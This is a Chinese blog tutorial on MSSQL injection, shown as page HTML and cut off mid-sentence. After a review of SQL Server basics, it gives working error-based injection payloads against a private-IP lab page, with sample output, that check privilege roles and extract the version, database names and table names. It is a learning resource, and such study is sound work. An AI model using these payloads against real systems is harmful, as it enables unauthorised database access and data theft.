@@ -1,0 +1,668 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>mssql注入学习 | 木鱼</title><meta name="keywords" content="SQL注入"><meta name="author" content="木鱼"><meta name="copyright" content="木鱼"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="MSSQL简介：SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。    同时mssql数据库具有强大的存储过程能够执行不同的高级功能，从而成为攻击者的突破口，本文复习了mssql的基本语法以及日常渗透过程中的基础使用，下面开始学习！ mssql默认安装数据库  mastermaster 数据库记录了所有的 SQL Server 数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mssql注入学习">
+<meta property="og:url" content="http://top7.top/posts/49982/index.html">
+<meta property="og:site_name" content="木鱼">
+<meta property="og:description" content="MSSQL简介：SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。    同时mssql数据库具有强大的存储过程能够执行不同的高级功能，从而成为攻击者的突破口，本文复习了mssql的基本语法以及日常渗透过程中的基础使用，下面开始学习！ mssql默认安装数据库  mastermaster 数据库记录了所有的 SQL Server 数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png">
+<meta property="article:published_time" content="2021-09-01T07:53:20.000Z">
+<meta property="article:modified_time" content="2021-09-18T09:04:05.435Z">
+<meta property="article:author" content="木鱼">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://top7.top/posts/49982/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'mssql注入学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-09-18 17:04:05'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    document.addEventListener('pjax:complete', detectApple)})(window)</script><link rel="stylesheet" href="/css/fish.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zyoushuo/Blog@latest/hexo/css/loading_style_1.css" ><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zyoushuo/Blog@latest/hexo/css/loading_style_2.css" ><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body>
+<div id='loader'>
+    
+    <div class="outer_box">
+    <div class='loader_overlay'></div>
+    <div class='loader_cogs'>
+        <div class='loader_cogs__top'>
+            <div class='top_part'></div>
+            <div class='top_part'></div>
+            <div class='top_part'></div>
+            <div class='top_hole'></div>
+        </div>
+        <div class='loader_cogs__left'>
+            <div class='left_part'></div>
+            <div class='left_part'></div>
+            <div class='left_part'></div>
+            <div class='left_hole'></div>
+        </div>
+        <div class='loader_cogs__bottom'>
+            <div class='bottom_part'></div>
+            <div class='bottom_part'></div>
+            <div class='bottom_part'></div>
+            <div class='bottom_hole'></div>
+        </div>
+        <p style="text-align:center">&nbsp;&nbsp;&nbsp;loading...</p>
+    </div>
+    </div>
+    
+</div>
+
+<script>
+    var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+    }
+    window.addEventListener('load',endLoading);
+</script>
+
+<div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fab fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/home/"><i class="fa-fw fab fa-phoenix-framework"></i><span> 主页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">木鱼</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fab fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/home/"><i class="fa-fw fab fa-phoenix-framework"></i><span> 主页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">mssql注入学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-09-01T07:53:20.000Z" title="发表于 2021-09-01 15:53:20">2021-09-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-09-18T09:04:05.435Z" title="更新于 2021-09-18 17:04:05">2021-09-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>37分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="MSSQL简介："><a href="#MSSQL简介：" class="headerlink" title="MSSQL简介："></a>MSSQL简介：</h1><p>SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。    同时mssql数据库具有强大的存储过程能够执行不同的高级功能，从而成为攻击者的突破口，本文复习了mssql的基本语法以及日常渗透过程中的基础使用，下面开始学习！</p>
+<p>mssql默认安装数据库</p>
+<ul>
+<li><strong>master</strong><br>master 数据库记录了所有的 SQL Server 数据库系统的系统级信息，如用户帐户，配置设置，并存在所有其他数据库信息。</li>
+<li><strong>model</strong><br>model 数据库是一个模板数据库。每当创建一个新的数据库（包括系统数据库的TempDB），会创建一个以 Model 数据库为副本数据库，并更改成你创建数据库时所用的名称。</li>
+<li><strong>msdb</strong><br>msdb 数据库是 SQL Server 代理的数据库，用于配置警报使用 SQL Server 代理和预定作业等。</li>
+<li><strong>tempdb</strong><br>tempddb 数据库是由 SQL Server 用于暂时存储数据的，这其中包含所有临时表，临时存储过程，并通过 SQL Server 生成任何其他临时存储需求。</li>
+</ul>
+<h1 id="MSSQL语法"><a href="#MSSQL语法" class="headerlink" title="MSSQL语法"></a>MSSQL语法</h1><p>mssql sql语法对大小写不敏感，可以将sql分为两个部分：数据操作语言(DML)和数据定义语言(DDL)</p>
+<p>数据操作语言（DML）只要是用于查询和更新</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 从数据库中获取数据</span><br><span class="line">update 更新数据库中的数据</span><br><span class="line">delete 删除数据</span><br><span class="line">insert into 添加数据</span><br></pre></td></tr></table></figure>
+
+<p>数据库定义语言(DDL)  主要用于创建，删除，增加索引，键，约束等</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE - 创建新数据库</span><br><span class="line">ALTER DATABASE - 修改数据库</span><br><span class="line">CREATE TABLE - 创建新表</span><br><span class="line">ALTER TABLE - 变更（改变）数据库表</span><br><span class="line">DROP TABLE - 删除表</span><br><span class="line">CREATE INDEX - 创建索引（搜索键）</span><br><span class="line">DROP INDEX - 删除索引</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1.创建数据库"></a>1.创建数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database 数据库名</span><br><span class="line">实例：</span><br><span class="line"><span class="keyword">create</span> database SQLTest</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-select-语句"><a href="#2-select-语句" class="headerlink" title="2.select 语句"></a>2.select 语句</h2><p>select 语句用于查询指定数据表中的数据，select语句中可以使用各种条件对查询数据进行限制</p>
+<p>where—-有条件的从表中选取数据</p>
+<p>and 和 or — 基于一个以上的条件对记录进行过滤</p>
+<p>order by —对结果进行排序（默认是升序），若在语句后面添加desc，则是降序</p>
+<p>top —规定要返回记录的数目（可以是返回的具体数目 ， 也可以是百分比）</p>
+<p>like —在where子句中搜索列的指定模式</p>
+<p>between—在where子句中使用 ，选取介于两者之间的数据</p>
+<p>select distinct—句用于返回唯一不同的值</p>
+<p>通配符（%、_ 、[charlist] 、[^charlist]/[!charlist] ）—可替代一个或多个字符，必须与like一起使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">select 列名称 from 表名称</span><br><span class="line"></span><br><span class="line">select * from user;</span><br><span class="line">select * from user where id=1;  查询id为1的数据</span><br><span class="line"></span><br><span class="line">and，or</span><br><span class="line">select * from user where id&gt;3 and id&lt;5   查询id大于3和小于5的数据</span><br><span class="line">select * from user where id&gt;3 or id&lt;5    查询id大于3或小于5的数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">order by </span><br><span class="line">select * from user order by name;根据name进行排序</span><br><span class="line">select * from user order by name desc; 降序排列</span><br><span class="line">select * from user order by name asc;升序排序</span><br><span class="line"></span><br><span class="line">top</span><br><span class="line">select top 1 name from users，查询user表中name列的第一条数据</span><br><span class="line">select top 1 name from users where name !=&quot;a&quot; 查询user表中name列不等于a的数据，假设第一条数据的值为a，那么就可以通过该方法获取到第二条的数据</span><br><span class="line"></span><br><span class="line">like  通配符</span><br><span class="line">select * from teacher  where  name like &#x27;a%&#x27;;  --查找name是以a开头的所有列</span><br><span class="line">select * from teacher where name like &#x27;%b&#x27;;  --查找name是以b结尾的所有列</span><br><span class="line">select * from teacher where  name  like &#x27;a_&#x27;;  --查找name是以a开头后面只有一个字符 的所有列</span><br><span class="line">select * from teacher where name like &#x27;[ac]%&#x27;;  --  查找name是以a/c开头的所有列</span><br><span class="line">select * from teacher  where name like &#x27;[^ac]%&#x27;; --查找name 不是以a/c开头的所有列</span><br><span class="line"></span><br><span class="line">between and</span><br><span class="line">select * from user where name between 1 and 2 查找那么介于1和2之间的数据</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-insert-into语句"><a href="#3-insert-into语句" class="headerlink" title="3.insert into语句"></a>3.insert into语句</h2><p>insert语句用户向表中插入数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名称 values(值1，值2)  值的数量要与表的列数量要相等</span><br><span class="line"></span><br><span class="line">insert into 表名称(列1，列2) values(值1，值2)   向表的指定列插入指定的值</span><br><span class="line"></span><br><span class="line">举例;</span><br><span class="line">insert into users(id,username,password) values(1,&#x27;a&#x27;,&#x27;b&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-UPDATE-语句"><a href="#4-UPDATE-语句" class="headerlink" title="4.UPDATE 语句"></a>4.UPDATE 语句</h2><p>UPDATE语句用于更新数据以及权限等。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update 表名称 set 列名称=新值 where 列名称=某值</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">update users set username=&quot;张三&quot; where id=1</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-DELETE-语句"><a href="#5-DELETE-语句" class="headerlink" title="5.DELETE 语句"></a>5.DELETE 语句</h2><p>delete 用于删除表中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM 表名称 where 列名称=值</span><br></pre></td></tr></table></figure>
+
+<h1 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>MSSQL数据库中存在大量的系统视图表，我们可以通过自带表格查询我们需要的字段信息</p>
+<p>1.<strong>sysobjects</strong>表</p>
+<p> 此系统表中对我们有用的只有3个字段，<code>NAME</code>字段和<code>XTYPE</code>字段和<code>ID</code>字段，<code>name就是表名信息</code>，<code>xtype是代表表的类型</code>，只有两个参数，<code>S</code>代表系统自带表，<code>U</code>代表用户创建的表，<code>id</code>字段的值用来<code>连接syscolumns</code>表</p>
+<p>select * from sysobjects where xtype=’U’</p>
+<p><img src="image-20210902105546186.png" alt="image-20210902105546186"></p>
+<p>2.syscolumns 表</p>
+<p>syscolumns表中包含了表中所有的字段，可以通过sysobjects表中的id值进行定位，例如查询users表的所有的字段</p>
+<p><strong>select * from syscolumns where id=1611152785</strong></p>
+<p><img src="image-20210902110644315.png" alt="image-20210902110644315"></p>
+<p>实现MySQL的group_concat功能：</p>
+<p><strong>SELECT top 1 id, [name] = stuff((SELECT ‘,’ + [name] FROM syscolumns sys WHERE sys.id = syscolumns.id FOR xml path(‘’)) , 1 , 1 , ‘’) FROM syscolumns where id =1611152785</strong></p>
+<p><img src="image-20210902110936902.png" alt="image-20210902110936902"></p>
+<p>MSSQL注入常用参数</p>
+<p><code>@@version</code>，查询当前数据库版本 <code>db_name()</code>，查询当前数据库名称 <code>user</code>，查询当前用户 <code>IS_SRVROLEMEMBER()</code>，查询数据库权限。</p>
+<p>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p>
+<p>查询是否具备对应的权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 返回为1时证明有该权限</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;serveradmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;setupadmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;securityadmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;diskadmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;bulkadmin&#x27;));--</span><br><span class="line">and 1=(select IS_MEMBER(&#x27;db_owner&#x27;));</span><br></pre></td></tr></table></figure>
+
+<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="判断是否是mssql数据库"><a href="#判断是否是mssql数据库" class="headerlink" title="判断是否是mssql数据库"></a>判断是否是mssql数据库</h3><p>sysobjects数据表是mssql数据库特有的，所以查询该数据库如果成功的话就大概率为mssql数据库</p>
+<p>(select count(*) from sysobjects)&gt;0   该语句是统计sysobjects中的列数，如果为mssql数据库的话，结果恒为真，如果不是，则会报错</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20and%20(select%20count(*)%20from%20sysobjects)%3E0 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and user&gt;0   </span><br><span class="line"><span class="meta">#</span><span class="bash">回显</span></span><br><span class="line">Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;dbo&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">?id=1 and (select count(*) from msysobjects)&gt;0　　access数据库</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select @@version)   获取版本信息</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20and 1=(select @@version) --+</span><br><span class="line"><span class="meta">#</span><span class="bash">回显信息</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) Apr 2 2010 15:48:46 Copyright (c) Microsoft Corporation Developer Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor) &#x27; 转换成数据类型 int 时失败</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看数据库名称"><a href="#查看数据库名称" class="headerlink" title="查看数据库名称"></a>查看数据库名称</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select db_name())</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20and 1=(select db_name()) --+</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">回显</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;test&#x27; 转换成数据类型 int 时失败。</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h3><p>使用top 语句获取第一个数据库的名称，数据库名称可以在sysdatabases数据表中进行查询，当dbid&gt;4时显示的为用户创建的数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4) --+</span><br><span class="line"><span class="meta">#</span><span class="bash">返回值</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;ReportServer&#x27; 转换成数据类型 int 时失败</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获取第二个数据库</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name!=&#x27;ReportServer&#x27;) --+</span><br><span class="line"></span><br><span class="line">通过添加and语句使得查询第二条语句，可以不断进行累加，获取所有的数据库名</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from master..sysdatabases where dbid&gt;5 )</span><br><span class="line">修改bid的值可以达到相同的效果</span><br><span class="line"></span><br><span class="line">获取所有的数据库名</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select  name from master..sysdatabases for xml path) --+</span><br></pre></td></tr></table></figure>
+
+<p>在源代码中可以看到所有的数据库名<img src="image-20210902133706754.png" alt="image-20210902133706754"></p>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>获取表明可以通过sysobjects中xtype为‘U’的表进行查询</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select top 1 name from sysobjects where xtype=&#x27;U&#x27;) </span><br><span class="line">获取第一个的xtype=u的数据表</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from sysobjects where xtype=&#x27;U&#x27;) --+</span><br><span class="line"></span><br><span class="line">返回值：</span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;emails&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">同理可以增加限定条件获取第二个表的名称</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from sysobjects where xtype=&#x27;U&#x27; and name!=&#x27;emails&#x27;) --+</span><br><span class="line">返回值：</span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 